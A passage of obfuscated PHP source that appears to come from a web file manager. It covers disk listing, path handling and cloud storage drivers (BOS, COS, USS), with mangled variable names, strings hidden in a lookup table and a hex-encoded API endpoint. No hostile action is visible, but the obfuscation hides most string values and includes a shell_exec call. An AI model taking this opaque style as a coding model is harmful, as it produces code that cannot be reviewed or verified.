systemPath($óÚ¨ÊÌ¿) { $İˆôù‹Õ =& $_SERVER[ç¦¬”œš]; $ÓÖòÈÌ˜ = $İˆôù‹Õ[1381] . ucfirst($óÚ¨ÊÌ¿); $€ÉÔ”‹ = Model($İˆôù‹Õ[850])->get($ÓÖòÈÌ˜); if ($€ÉÔ”‹) { return $€ÉÔ”‹; } if ($óÚ¨ÊÌ¿ == $İˆôù‹Õ[191]) { $€ÉÔ”‹ = self::make(Model($İˆôù‹Õ[904])->systemRootPathAdd($İˆôù‹Õ[614])); } else { $€ÉÔ”‹ = self::systemPath($İˆôù‹Õ[191]); $ßàš¼ = self::sourceID($€ÉÔ”‹); $€ÉÔ”‹ = self::make(Model($İˆôù‹Õ[904])->mkdir($ßàš¼, $óÚ¨ÊÌ¿)); } Model($İˆôù‹Õ[850])->set($ÓÖòÈÌ˜, $€ÉÔ”‹); return $€ÉÔ”‹; } public static function systemFolder($æ‚’µ‰) { $¶ ûÅŒŞ = IO_PATH_SYSTEM_SOURCE . $æ‚’µ‰; $Ê“ßø¥Ø = Cache::get($¶ ûÅŒŞ); if (!$Ê“ßø¥Ø) { $Ã£½†¤ş = IO::infoFullSimple($¶ ûÅŒŞ); if (!$Ã£½†¤ş) { $Ê“ßø¥Ø = IO::mkdir($¶ ûÅŒŞ, REPEAT_SKIP); } else { $Ê“ßø¥Ø = $Ã£½†¤ş[$_SERVER[ç¦¬”œš][87]]; } Cache::set($¶ ûÅŒŞ, $Ê“ßø¥Ø, 3600 * 10); } return $Ê“ßø¥Ø; } public static function defaultDriver() { return Model($_SERVER[ç¦¬”œš][847])->defaultDriver(); } public static function defaultIO() { $ê‡ç¾¬è =& $_SERVER[ç¦¬”œš]; $·½…«ì = self::defaultDriver(); return $ê‡ç¾¬è[1382] . $·½…«ì[$ê‡ç¾¬è[484]] . $ê‡ç¾¬è[1370]; } public static function defaultDriverInit() { static $ äÓ = false; if ($ äÓ) { return $ äÓ; } $ äÓ = IO::init(self::defaultIO()); return $ äÓ; } public static function fileTypeList() { $ù·Áöñ° =& $_SERVER[ç¦¬”œš]; $¢™ÊËš” = $GLOBALS[$ù·Áöñ°[6]][$ù·Áöñ°[1383]]; foreach ($¢™ÊËš” as $•µ‘ßÚ‰ => $§‰×‘º) { $¿ñ»‚¿È = $ù·Áöñ°[1384] . $•µ‘ßÚ‰; $ ô­ÑŠà = LNG($¿ñ»‚¿È); if ($¿ñ»‚¿È != $ ô­ÑŠà) { $¢™ÊËš”[$•µ‘ßÚ‰][$ù·Áöñ°[32]] = $ ô­ÑŠà; } } return $¢™ÊËš”; } public static function diskList($¬õÎËãñ = true) { $øâ®ï‚á = $_SERVER[ç¦¬”œš][1385]; if ($¬õÎËãñ) { $­àßÃÆŠ = Cache::get($øâ®ï‚á); if (is_array($­àßÃÆŠ)) { return $­àßÃÆŠ; } } $­àßÃÆŠ = self::diskListGet(); Cache::set($øâ®ï‚á, $­àßÃÆŠ, 60); return $­àßÃÆŠ; } public static function diskListGet() { $„ˆÑĞäŠ =& $_SERVER[ç¦¬”œš]; $Óƒ©éõÄ = array(); if ($GLOBALS[$„ˆÑĞäŠ[6]][$„ˆÑĞäŠ[1386]] == $„ˆÑĞäŠ[1387]) { $Ø¡ğ‰¯µ = $„ˆÑĞäŠ[1388]; for ($âÕßĞˆâ = 0; $âÕßĞˆâ < strlen($Ø¡ğ‰¯µ); $âÕßĞˆâ++) { $—‘˜Ä–â = $Ø¡ğ‰¯µ[$âÕßĞˆâ] . $„ˆÑĞäŠ[1389]; if (file_exists($—‘˜Ä–â)) { $Óƒ©éõÄ[] = $—‘˜Ä–â; } } return $Óƒ©éõÄ; } if (!function_exists($„ˆÑĞäŠ[101])) { $Óƒ©éõÄ[] = $„ˆÑĞäŠ[915]; return $Óƒ©éõÄ; } $¸•ëÇè = explode($„ˆÑĞäŠ[262], shell_exec($„ˆÑĞäŠ[1390])); array_shift($¸•ëÇè); array_pop($¸•ëÇè); $…¶Æşë = array($„ˆÑĞäŠ[1391], $„ˆÑĞäŠ[1392], $„ˆÑĞäŠ[1393], $„ˆÑĞäŠ[1394], $„ˆÑĞäŠ[1395], $„ˆÑĞäŠ[1396], $„ˆÑĞäŠ[1397], $„ˆÑĞäŠ[1398]); foreach ($¸•ëÇè as $ƒã ªõÔ) { $ş»ÜËÍâ = preg_split($„ˆÑĞäŠ[1399], $ƒã ªõÔ); $—‘˜Ä–â = $ş»ÜËÍâ[count($ş»ÜËÍâ) - 1]; if (!strstr($ş»ÜËÍâ[0], $„ˆÑĞäŠ[1400]) || !$—‘˜Ä–â) { continue; } $î•œ®§¡ = rtrim($—‘˜Ä–â, $„ˆÑĞäŠ[8]) . $„ˆÑĞäŠ[8]; if (in_array($î•œ®§¡, $…¶Æşë)) { continue; } $Óƒ©éõÄ[] = $î•œ®§¡; } return $Óƒ©éõÄ; } public static function isSameDisk($¶ùØïòÂ, $ú–Ó¦Å¸) { $îí•¥åÃ =& $_SERVER[ç¦¬”œš]; if ($GLOBALS[$îí•¥åÃ[6]][$îí•¥åÃ[1386]] == $îí•¥åÃ[1387]) { return strtolower(substr($¶ùØïòÂ, 0, 1)) == strtolower(substr($ú–Ó¦Å¸, 0, 1)); } $éçá†‡à = self::diskList(); $•ÛåÛ«‰ = !1; $›œ³ÒÖ² = !1; sort($éçá†‡à); $éçá†‡à = array_reverse($éçá†‡à); $¶ùØïòÂ = rtrim($¶ùØïòÂ, $îí•¥åÃ[8]) . $îí•¥åÃ[8]; $ú–Ó¦Å¸ = rtrim($ú–Ó¦Å¸, $îí•¥åÃ[8]) . $îí•¥åÃ[8]; foreach ($éçá†‡à as $£š‚…Á€) { $ù‘½â˜¼ = strlen($£š‚…Á€); if (!$•ÛåÛ«‰ && substr($¶ùØïòÂ, 0, $ù‘½â˜¼) == $£š‚…Á€) { $•ÛåÛ«‰ = $£š‚…Á€; } if (!$›œ³ÒÖ² && substr($ú–Ó¦Å¸, 0, $ù‘½â˜¼) == $£š‚…Á€) { $›œ³ÒÖ² = $£š‚…Á€; } if ($•ÛåÛ«‰ && $›œ³ÒÖ²) { break; } } return $•ÛåÛ«‰ === $›œ³ÒÖ²; } public static function transferType($şıõÎ, $Å„µÈëı) { $õşÀŒ =& $_SERVER[ç¦¬”œš]; $Ä³°çÜ = self::driverType($şıõÎ); $·¶Ôå¢¡ = self::driverType($Å„µÈëı); if ($Ä³°çÜ[$õşÀŒ[33]] == $·¶Ôå¢¡[$õşÀŒ[33]] && $Ä³°çÜ[$õşÀŒ[1401]] == $·¶Ôå¢¡[$õşÀŒ[1401]]) { return $õşÀŒ[1402]; } if ($Ä³°çÜ[$õşÀŒ[33]] == $õşÀŒ[948] && $·¶Ôå¢¡[$õşÀŒ[33]] == $õşÀŒ[109]) { return $õşÀŒ[1280]; } if ($Ä³°çÜ[$õşÀŒ[33]] == $õşÀŒ[109] && $·¶Ôå¢¡[$õşÀŒ[33]] == $õşÀŒ[948]) { return $õşÀŒ[110]; } return $õşÀŒ[1403]; } public static function driverType($¬†¡»İè) { $É•Æ¶™ =& $_SERVER[ç¦¬”œš]; $ñ¼„Û²ã = str_replace($É•Æ¶™[1404], $É•Æ¶™[12], strtolower($¬†¡»İè->getType())); if ($ñ¼„Û²ã == $É•Æ¶™[837] || $ñ¼„Û²ã == $É•Æ¶™[1405] || $ñ¼„Û²ã == $É•Æ¶™[1406]) { $¬†¡»İè = self::defaultDriverInit(); } else { if ($ñ¼„Û²ã == $É•Æ¶™[1290] || $ñ¼„Û²ã == $É•Æ¶™[1407]) { $¬†¡»İè = IO::init($¬†¡»İè->pathParse[$É•Æ¶™[1233]]); } } $è˜Ş˜ « = $¬†¡»İè->path; $ñ¼„Û²ã = str_replace($É•Æ¶™[1404], $É•Æ¶™[12], strtolower($¬†¡»İè->getType())); if ($ñ¼„Û²ã == $É•Æ¶™[109]) { return array($É•Æ¶™[33] => $É•Æ¶™[109], $É•Æ¶™[1401] => $É•Æ¶™[12], $É•Æ¶™[87] => $è˜Ş˜ «, $É•Æ¶™[98] => $¬†¡»İè); } return array($É•Æ¶™[33] => $É•Æ¶™[948], $É•Æ¶™[1401] => $¬†¡»İè->pathDriver, $É•Æ¶™[87] => $è˜Ş˜ «, $É•Æ¶™[98] => $¬†¡»İè); } public static function pathDriverType($Êæß£§) { return $Êæß£§ ? self::driverType(IO::init($Êæß£§)) : !1; } public static function pathDriverLocal($òûùãÔ½) { $ ô¶“¿ =& $_SERVER[ç¦¬”œš]; $›‹Ê±”® = $òûùãÔ½ ? self::driverType(IO::init($òûùãÔ½)) : !1; return strtolower($›‹Ê±”®[$ ô¶“¿[33]]) == $ ô¶“¿[109] ? !0 : !1; } public static function allowCover($îÆú„¹, $ÄøÔ²ç© = true) { $¬§•§× =& $_SERVER[ç¦¬”œš]; if (is_string($îÆú„¹)) { $îÆú„¹ = IO::info($îÆú„¹); } if (!$îÆú„¹ || $îÆú„¹[$¬§•§×[33]] == $¬§•§×[78] || $îÆú„¹[$¬§•§×[79]] <= 100) { return !1; } if (isset($îÆú„¹[$¬§•§×[1408]]) || !$îÆú„¹[$¬§•§×[87]]) { return !1; } if (isset($îÆú„¹[$¬§•§×[232]]) && !$îÆú„¹[$¬§•§×[232]]) { return !1; } static $Õ¥­á¹Ğ = false; if (!$Õ¥­á¹Ğ || !$ÄøÔ²ç©) { $şšïĞ” = self::driverType(IO::init($îÆú„¹[$¬§•§×[87]])); $’–èıÜ = $şšïĞ”[$¬§•§×[98]]; $Õ¥­á¹Ğ = $¬§•§×[196]; if ($şšïĞ”[$¬§•§×[33]] == $¬§•§×[109]) { $Õ¥­á¹Ğ = $¬§•§×[1409]; } if ($şšïĞ”[$¬§•§×[98]] && is_array($şšïĞ”[$¬§•§×[98]]->config)) { $ËŠŞÓ = $şšïĞ”[$¬§•§×[98]]->config; if (isset($ËŠŞÓ[$¬§•§×[1410]]) && $ËŠŞÓ[$¬§•§×[1410]]) { $Õ¥­á¹Ğ = $¬§•§×[1409]; } } $èáÊìÒá = KodIO::defaultDriver(); if (strtolower($èáÊìÒá[$¬§•§×[98]]) == $¬§•§×[109] && is_array($èáÊìÒá[$¬§•§×[6]])) { $äú‘¸óâ = $èáÊìÒá[$¬§•§×[6]][$¬§•§×[1263]]; if (substr($äú‘¸óâ, 0, 2) == $¬§•§×[1411]) { $äú‘¸óâ = str_replace($¬§•§×[1411], BASIC_PATH, $äú‘¸óâ); } $äú‘¸óâ = str_replace($¬§•§×[601], $¬§•§×[8], $äú‘¸óâ); if (substr($îÆú„¹[$¬§•§×[87]], 0, strlen($äú‘¸óâ)) == $äú‘¸óâ) { $Õ¥­á¹Ğ = $¬§•§×[196]; } } } return $Õ¥­á¹Ğ == $¬§•§×[1409] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ì½â­ƒ¿) { parent::__construct($ì½â­ƒ¿); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($»æªãğ) { $Ø˜ú‡È˜ =& $_SERVER[ç¦¬”œš]; if (substr($»æªãğ, 0, 7) == $Ø˜ú‡È˜[313]) { $»æªãğ = $Ø˜ú‡È˜[314] . substr($»æªãğ, 7); } header($Ø˜ú‡È˜[175] . $»æªãğ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($˜€Í•Œ¼) { parent::__construct($˜€Í•Œ¼); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } public function uploadFormData($®ƒˆõ‰, $›·ÇÙ¼¨ = 3600) { $‹…òëƒ =& $_SERVER[ç¦¬”œš]; $ßİè¬ŒÈ = $‹…òëƒ[229]; $ŠíŠ¦ÕÙ = $‹…òëƒ[263]; $¹€áçç¶ = $‹…òëƒ[274]; $˜«ĞÛ¾Ï = gmdate($‹…òëƒ[299], time() + $›·ÇÙ¼¨); $«ˆçôáµ = (string) time() . $‹…òëƒ[74] . (string) (time() + $›·ÇÙ¼¨); $¡Ã¹İã¬ = array($‹…òëƒ[275] => $˜«ĞÛ¾Ï, $‹…òëƒ[278] => array(array($‹…òëƒ[280] => $ßİè¬ŒÈ), array($‹…òëƒ[279] => $this->bucket), array($‹…òëƒ[281], $‹…òëƒ[282], $‹…òëƒ[12]), array($‹…òëƒ[285] => $¹€áçç¶), array($‹…òëƒ[1412] => $ŠíŠ¦ÕÙ), array($‹…òëƒ[1413] => $this->accessKey), array($‹…òëƒ[1414] => $«ˆçôáµ))); $¡Ã¹İã¬ = json_encode($¡Ã¹İã¬); $¯¨Š­ªß = hash_hmac($‹…òëƒ[263], $«ˆçôáµ, $this->secret); $ÓÓí¸”´ = sha1($¡Ã¹İã¬); $çÓ¢ÉÓ• = hash_hmac($‹…òëƒ[263], $ÓÓí¸”´, $¯¨Š­ªß); $çÒÆöçŸ = array($‹…òëƒ[280] => $ßİè¬ŒÈ, $‹…òëƒ[285] => $¹€áçç¶, $‹…òëƒ[293] => base64_encode($¡Ã¹İã¬), $‹…òëƒ[1412] => $ŠíŠ¦ÕÙ, $‹…òëƒ[1413] => $this->accessKey, $‹…òëƒ[1415] => $«ˆçôáµ, $‹…òëƒ[1416] => $çÓ¢ÉÓ•, $‹…òëƒ[208] => $this->getHost()); return $çÒÆöçŸ; } public function fileOutImage($î¥Ò™Ô, $Şó¶¼Â = 250) { $²Âµ„„ß =& $_SERVER[ç¦¬”œš]; if ($this->size($î¥Ò™Ô) > 1024 * 1024 * 32) { return $this->fileOutImageServer($î¥Ò™Ô, $Şó¶¼Â); } $ôÕş Æ = $this->link($î¥Ò™Ô); $ôÕş Æ .= $²Âµ„„ß[1417] . $Şó¶¼Â . $²Âµ„„ß[1418]; $this->fileOutLink($ôÕş Æ); } public function fileOutLink($„Œ²‹¸©) { $óŒşîº =& $_SERVER[ç¦¬”œš]; if (substr($„Œ²‹¸©, 0, 7) == $óŒşîº[313]) { $„Œ²‹¸© = $óŒşîº[314] . substr($„Œ²‹¸©, 7); } header($óŒşîº[175] . $„Œ²‹¸©); die; } } goto EÜğöÑ…È‚; eë˜ò”‚À¤: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ĞÉÍÒäí, $ÛØšÆíª = 0) { parent::__construct(); $this->source = $ĞÉÍÒäí; $this->sourceSize = $ÛØšÆíª; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($×ù¥¥Ø¬ = false) { return $this->sourceSize; } public function getContent($¿’¤±”ù = false) { return $this->fileSubstr($¿’¤±”ù, 0, $this->sourceSize); } public function fileSubstr($ØÙÄÏè  = false, $ö—¯Â¡ = 0, $š”°­‹ = 0) { if (!$š”°­‹) { $š”°­‹ = $this->sourceSize; } $ñÇÛÊĞ = $this->sourceSize - $ö—¯Â¡; if ($š”°­‹ >= $ñÇÛÊĞ) { $š”°­‹ = $ñÇÛÊĞ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ö—¯Â¡, $š”°­‹); } if ($this->sourceType == self::TYPE_FILE) { if ($š”°­‹ <= 0) { return $_SERVER[ç¦¬”œš][12]; } $¬âí›Şı = ftell($this->source); fseek_64($this->source, $¬âí›Şı + $ö—¯Â¡); $¡È¾Âş = @fread($this->source, $š”°­‹); fseek_64($this->source, $¬âí›Şı); return $¡È¾Âş; } } public function hashMd5($•ÑîÈÇú = false) { return md5($this->getContent()); } public static function hash($‰ùÃÆúË, $®Ó¼¢¸ = 0) { $ÙàÒÆì = new PathDriverStream($‰ùÃÆúË, $®Ó¼¢¸); return $ÙàÒÆì->hashSimple($‰ùÃÆúË); } public static function md5($º¦««Ÿ, $öÏäøÎ = 0) { $úğ¥Şœ› = new PathDriverStream($º¦««Ÿ, $öÏäøÎ); return $úğ¥Şœ›->hashMd5($º¦««Ÿ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\57\57\166\x30\x2e\x61\x70\x69\56\165\160\171\x75\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ùÈ†’¾Ö) { parent::__construct(); $this->_init($ùÈ†’¾Ö); } public function _init($·Î“®¾) { $¥ÚÅçİÊ =& $_SERVER[ç¦¬”œš]; foreach ($·Î“®¾ as $—ØÍĞ¦ => $ñ„š¥¶î) { if (isset($this->{$—ØÍĞ¦})) { $this->{$—ØÍĞ¦} = $ñ„š¥¶î; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¥ÚÅçİÊ[1545] . LNG($¥ÚÅçİÊ[1464])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($°ó¢æŞ, $œµ¾‘Å = "\107\x45\x54") { $åöï± Ô =& $_SERVER[ç¦¬”œš]; $¾ªÖ§ş§ = gmdate($åöï± Ô[1493]); $îÕàäìå = base64_encode(hash_hmac($åöï± Ô[1546], "{$œµ¾‘Å}\x26{$°ó¢æŞ}\46{$¾ªÖ§ş§}", md5("{$this->userpass}"), !0)); $ëÇ¦™„¢ = array("\101\x75\x74\150\157\162\151\x7a\x61\x74\151\x6f\156\x3a\125\x50\x59\125\116\x20{$this->username}\x3a{$îÕàäìå}", "\104\x61\164\x65\x3a{$¾ªÖ§ş§}"); return $ëÇ¦™„¢; } public function ussRequest($¯àĞ·—, $Ğ»±àÒ¶ = "\107\105\x54", $ŠÒ˜· = false, $¢÷³ À = false, $¶†¸¨Û = false) { $óİµÆ‹Ó =& $_SERVER[ç¦¬”œš]; $¯àĞ·— = trim($¯àĞ·—, $óİµÆ‹Ó[8]); $îÓâéÙ‡ = "\x2f{$this->bucket}\57{$¯àĞ·—}"; $å…„Ìçğ = $this->ussHeaders($îÓâéÙ‡, $Ğ»±àÒ¶); if ($¢÷³ À) { $å…„Ìçğ = array_merge($å…„Ìçğ, $¢÷³ À); } $¯õåÊÙ£ = url_request($this->endpoint . $îÓâéÙ‡, $Ğ»±àÒ¶, $ŠÒ˜·, $å…„Ìçğ, $¶†¸¨Û); if (!$¯õåÊÙ£) { $¢Ìëë‘ì = LNG($óİµÆ‹Ó[1547]); $this->writeLog($¢Ìëë‘ì); return array($óİµÆ‹Ó[1298] => !1, $óİµÆ‹Ó[1288] => $¢Ìëë‘ì); } if (strtolower($Ğ»±àÒ¶) == $óİµÆ‹Ó[227] || in_array($¯õåÊÙ£[$óİµÆ‹Ó[1298]], array($óİµÆ‹Ó[274], $óİµÆ‹Ó[1548]))) { $ŠÒ˜· = $¯õåÊÙ£[$óİµÆ‹Ó[1549]]; } else { $ŠÒ˜· = json_decode($¯õåÊÙ£[$óİµÆ‹Ó[1288]], !0); if (!$ŠÒ˜·) { $ŠÒ˜· = $¯õåÊÙ£[$óİµÆ‹Ó[1288]]; } else { if (!$¯õåÊÙ£[$óİµÆ‹Ó[830]] && isset($ŠÒ˜·[$óİµÆ‹Ó[1550]])) { $ŠÒ˜· = $ŠÒ˜·[$óİµÆ‹Ó[1550]]; } } } if (!$¯õåÊÙ£[$óİµÆ‹Ó[830]]) { $this->writeLog($this->__errorMessage($ŠÒ˜·)); } return array($óİµÆ‹Ó[1298] => $¯õåÊÙ£[$óİµÆ‹Ó[830]], $óİµÆ‹Ó[1288] => $ŠÒ˜·); } private function __errorMessage($çîİË¤Ñ) { $µ°ı§ÔÆ =& $_SERVER[ç¦¬”œš]; if (!$çîİË¤Ñ) { return $µ°ı§ÔÆ[12]; } static $çÔ´ç¶Ò = null; if (!$çÔ´ç¶Ò) { $çÔ´ç¶Ò = I18n::getType(); } if ($çÔ´ç¶Ò != $µ°ı§ÔÆ[1503]) { return $çîİË¤Ñ; } $šàè§Ã = array($µ°ı§ÔÆ[1551] => $µ°ı§ÔÆ[1552], $µ°ı§ÔÆ[1553] => $µ°ı§ÔÆ[1554], $µ°ı§ÔÆ[1555] => $µ°ı§ÔÆ[1554], $µ°ı§ÔÆ[1556] => $µ°ı§ÔÆ[1557], $µ°ı§ÔÆ[1558] => $µ°ı§ÔÆ[1559], $µ°ı§ÔÆ[1560] => $µ°ı§ÔÆ[1561], $µ°ı§ÔÆ[1562] => $µ°ı§ÔÆ[1563]); return isset($šàè§Ã[$çîİË¤Ñ]) ? $šàè§Ã[$çîİË¤Ñ] : $çîİË¤Ñ; } public function mkfile($É¤é˜æ, $£—÷ÚÑ– = '', $óıüƒ×à = REPEAT_RENAME) { if ($this->setContent($É¤é˜æ, $£—÷ÚÑ–)) { return $this->getPathOuter($É¤é˜æ); } return !1; } public function mkdir($²ìäÌ‰Æ, $“¶îø‰¯ = REPEAT_SKIP) { $Í´ÚÈù =& $_SERVER[ç¦¬”œš]; $×Íøáİ˜ = trim($²ìäÌ‰Æ, $Í´ÚÈù[8]); if ($this->_isFolder($×Íøáİ˜)) { return $this->getPathOuter($×Íøáİ˜); } $ÂŸŠğŸË = array($Í´ÚÈù[1564]); $Ê®µÆşÉ = $this->ussRequest($×Íøáİ˜, $Í´ÚÈù[257], !1, $ÂŸŠğŸË); return $Ê®µÆşÉ[$Í´ÚÈù[1298]] ? $this->getPathOuter($×Íøáİ˜) : !1; } public function copyFile($‰„Õ€¾Ô, $Ûœ×…Ä¸) { $Œ©ÂÀó° =& $_SERVER[ç¦¬”œš]; $¤™»‰×¤ = array($Œ©ÂÀó°[1565] . "\x2f{$this->bucket}\57{$‰„Õ€¾Ô}", $Œ©ÂÀó°[1566]); $Ó¹¦ïğò = $this->ussRequest($Ûœ×…Ä¸, $Œ©ÂÀó°[259], !1, $¤™»‰×¤); return $Ó¹¦ïğò[$Œ©ÂÀó°[1298]] ? !0 : $this->getPathOuter($Ûœ×…Ä¸); } public function moveFile($ËÅ î†Ü, $¸ó¨ã×à) { $áÍ¢¹Ÿ½ =& $_SERVER[ç¦¬”œš]; $«¿–è˜ = array($áÍ¢¹Ÿ½[1567] . "\x2f{$this->bucket}\57{$ËÅ î†Ü}", $áÍ¢¹Ÿ½[1566]); $²üŸóèú = $this->ussRequest($¸ó¨ã×à, $áÍ¢¹Ÿ½[259], !1, $«¿–è˜); return $²üŸóèú[$áÍ¢¹Ÿ½[1298]] ? !0 : $this->getPathOuter($¸ó¨ã×à); } public function delFile($º‰¥âœ¹) { $Ë¬ŞÖÏ =& $_SERVER[ç¦¬”œš]; $®¢ù®’ê = $this->ussRequest($º‰¥âœ¹, $Ë¬ŞÖÏ[1568]); return $®¢ù®’ê[$Ë¬ŞÖÏ[1298]] ? !0 : !1; } public function delFolder($ÅÛª–›Â) { $œ˜¡–¶ø =& $_SERVER[ç¦¬”œš]; if (!$this->exist($ÅÛª–›Â)) { return !0; } $this->listItemCache = !1; $¨Äƒ¢‚Ï = $á•ñ‡ù® = array(); $this->fileList($ÅÛª–›Â, $¨Äƒ¢‚Ï, $á•ñ‡ù®, !0); $this->listItemCache = !0; foreach ($á•ñ‡ù® as $Ñ¥¡¬¹) { $ì¡Æˆøá = $this->ussRequest($Ñ¥¡¬¹[$œ˜¡–¶ø[32]], $œ˜¡–¶ø[1568]); if (!$ì¡Æˆøá[$œ˜¡–¶ø[1298]]) { return !1; } } foreach ($¨Äƒ¢‚Ï as $Ü“öŞ¤Ø) { $ì¡Æˆøá = $this->ussRequest($Ü“öŞ¤Ø, $œ˜¡–¶ø[1568]); if (!$ì¡Æˆøá[$œ˜¡–¶ø[1298]]) { return !1; } } $ì¡Æˆøá = $this->ussRequest($ÅÛª–›Â, $œ˜¡–¶ø[1568]); return $ì¡Æˆøá[$œ˜¡–¶ø[1298]]; } public function rename($†¶ÆÁ…ª, $³Ğ‹†…Ş) { if ($this->isFile($†¶ÆÁ…ª)) { $³Ğ‹†…Ş = get_path_father($†¶ÆÁ…ª) . $³Ğ‹†…Ş; return $this->moveFile($†¶ÆÁ…ª, $³Ğ‹†…Ş); } return $this->renameObject($†¶ÆÁ…ª, $³Ğ‹†…Ş); } public function fileInfo($³„°ö÷¼, $Öı¸¹®‹ = false, $åÎ¹ò—û = array()) { $ßúìÉ‰ó =& $_SERVER[ç¦¬”œš]; $æêñ©À = array($ßúìÉ‰ó[32] => $this->pathThis($³„°ö÷¼), $ßúìÉ‰ó[87] => $this->getPathOuter($ßúìÉ‰ó[8] . $³„°ö÷¼), $ßúìÉ‰ó[33] => $ßúìÉ‰ó[230], $ßúìÉ‰ó[79] => isset($åÎ¹ò—û[$ßúìÉ‰ó[79]]) ? $åÎ¹ò—û[$ßúìÉ‰ó[79]] : 0, $ßúìÉ‰ó[169] => $this->ext($³„°ö÷¼)); if ($Öı¸¹®‹) { return $æêñ©À; } $æêñ©À[$ßúìÉ‰ó[231]] = $æêñ©À[$ßúìÉ‰ó[88]] = 0; $æêñ©À[$ßúìÉ‰ó[232]] = $æêñ©À[$ßúìÉ‰ó[233]] = !0; if (empty($åÎ¹ò—û)) { $åÎ¹ò—û = $this->objectMeta($³„°ö÷¼); if (!$åÎ¹ò—û) { return $æêñ©À; } } $æêñ©À[$ßúìÉ‰ó[231]] = intval($åÎ¹ò—û[$ßúìÉ‰ó[1569]]); $æêñ©À[$ßúìÉ‰ó[88]] = intval($åÎ¹ò—û[$ßúìÉ‰ó[1570]]); $æêñ©À[$ßúìÉ‰ó[79]] = $åÎ¹ò—û[$ßúìÉ‰ó[79]]; return $æêñ©À; } public function folderInfo($…ö¡¿Î, $÷·“Ç¤ = false) { $õğç¦ô± =& $_SERVER[ç¦¬”œš]; $åê¤Ö´ = array($õğç¦ô±[32] => $this->pathThis($…ö¡¿Î), $õğç¦ô±[87] => $this->getPathOuter($õğç¦ô±[8] . $…ö¡¿Î), $õğç¦ô±[33] => $õğç¦ô±[78]); if ($÷·“Ç¤) { return $åê¤Ö´; } $åê¤Ö´[$õğç¦ô±[231]] = $åê¤Ö´[$õğç¦ô±[88]] = 0; $åê¤Ö´[$õğç¦ô±[232]] = $åê¤Ö´[$õğç¦ô±[233]] = !0; if (empty($üÊ¬÷®)) { $üÊ¬÷® = $this->objectMeta($…ö¡¿Î); if (!$üÊ¬÷®) { return $åê¤Ö´; } } $åê¤Ö´[$õğç¦ô±[231]] = intval($üÊ¬÷®[$õğç¦ô±[1569]]); $åê¤Ö´[$õğç¦ô±[88]] = intval($üÊ¬÷®[$õğç¦ô±[1570]]); return $åê¤Ö´; } private function listObjs($æ¹üêÅË, $²À»Éæ = 0, $ÅâÉíÚ– = 1000) { $…×ôÑ¶ =& $_SERVER[ç¦¬”œš]; $–Âôí•ó = array($…×ôÑ¶[1571], $…×ôÑ¶[1572] . $ÅâÉíÚ–); if ($²À»Éæ) { $–Âôí•ó[] = $…×ôÑ¶[1573] . $²À»Éæ; } $§ĞèæÖ = $this->ussRequest($æ¹üêÅË, $…×ôÑ¶[261], !1, $–Âôí•ó); return !$§ĞèæÖ[$…×ôÑ¶[1298]] ? !1 : $§ĞèæÖ[$…×ôÑ¶[1288]]; } private function fileList($¿§­Ÿ”², &$ĞƒÖ¯‘», &$·×Ñ”Â, $ş·Éèà = false) { $¤¢Ğ“µ =& $_SERVER[ç¦¬”œš]; $–ºòëµ€ = $¤¢Ğ“µ[12]; $£•ĞåÚè = 1000; $šŞãáà = rtrim($¿§­Ÿ”², $¤¢Ğ“µ[8]) . $¤¢Ğ“µ[8]; while (!0) { check_abort(); $¿İÕ›† = $this->listObjs($¿§­Ÿ”², $–ºòëµ€, $£•ĞåÚè); if (!$¿İÕ›†) { return !1; } $–ºòëµ€ = isset($¿İÕ›†[$¤¢Ğ“µ[1574]]) ? $¿İÕ›†[$¤¢Ğ“µ[1574]] : $¤¢Ğ“µ[12]; $çü½ÚèÕ = isset($¿İÕ›†[$¤¢Ğ“µ[1575]]) ? $¿İÕ›†[$¤¢Ğ“µ[1575]] : array(); foreach ($çü½ÚèÕ as $¸ÈìË…ö) { $ùÏÁ·Çß = $¸ÈìË…ö[$¤¢Ğ“µ[33]] == $¤¢Ğ“µ[78] ? !0 : !1; $İè¼òóÜ = ltrim($šŞãáà . $¸ÈìË…ö[$¤¢Ğ“µ[32]], $¤¢Ğ“µ[8]) . ($ùÏÁ·Çß ? $¤¢Ğ“µ[8] : $¤¢Ğ“µ[12]); $ßÉ—¡æ¿ = array($¤¢Ğ“µ[32] => $İè¼òóÜ, $¤¢Ğ“µ[33] => $ùÏÁ·Çß ? $¤¢Ğ“µ[78] : $¤¢Ğ“µ[230], $¤¢Ğ“µ[79] => $¸ÈìË…ö[$¤¢Ğ“µ[413]], $¤¢Ğ“µ[1570] => $¸ÈìË…ö[$¤¢Ğ“µ[1576]]); $this->cacheMethodInfoSet($İè¼òóÜ, $ùÏÁ·Çß, $ßÉ—¡æ¿); if ($ùÏÁ·Çß) { $ĞƒÖ¯‘»[] = $İè¼òóÜ; if ($ş·Éèà) { $this->fileList($İè¼òóÜ, $ĞƒÖ¯‘», $·×Ñ”Â, $ş·Éèà); } continue; } $·×Ñ”Â[] = $ßÉ—¡æ¿; } if (count($çü½ÚèÕ) < $£•ĞåÚè) { break; } } $this->cacheMethodInfoSet($¿§­Ÿ”², !0); } public function listPath($äüãù¢, $ÉÉüø = false) { $ œÎü†‹ =& $_SERVER[ç¦¬”œš]; $‘Õ÷½Î = $•Öª“Ü† = array(); $this->fileList($äüãù¢, $‘Õ÷½Î, $•Öª“Ü†); foreach ($‘Õ÷½Î as $ªÙµŞÆÊ => $³Ö»Ë€‡) { $‘Õ÷½Î[$ªÙµŞÆÊ] = $this->folderInfo($³Ö»Ë€‡, $ÉÉüø); } foreach ($•Öª“Ü† as $ªÙµŞÆÊ => $³Ö»Ë€‡) { $•Öª“Ü†[$ªÙµŞÆÊ] = 